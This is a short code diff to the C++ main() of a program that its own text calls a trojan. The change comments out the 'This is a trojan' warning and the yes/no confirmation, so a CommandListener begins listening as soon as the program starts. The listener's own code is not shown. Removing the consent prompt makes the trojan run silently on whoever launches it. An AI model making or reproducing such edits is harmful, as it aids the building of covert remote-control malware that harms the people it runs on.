@@ -24,13 +24,13 @@ int main()
 
   CommandListener listener;
 
-  cout << "[WARNING] This is a trojan. Do u really want to start? [Y] or [N]" << endl;
-  cin >> confirm;
-
-  if (confirm == "N") {
-    exit(1);
-  } else {
-      listener.startListening();
-  }
+  // cout << "[WARNING] This is a trojan. Do u really want to start? [Y] or [N]" << endl;
+  // cin >> confirm;
+  listener.startListening();
+  // if (confirm == "N") {
+  //   exit(1);
+  // } else {
+  //     listener.startListening();
+  // }
   return 0;
 }
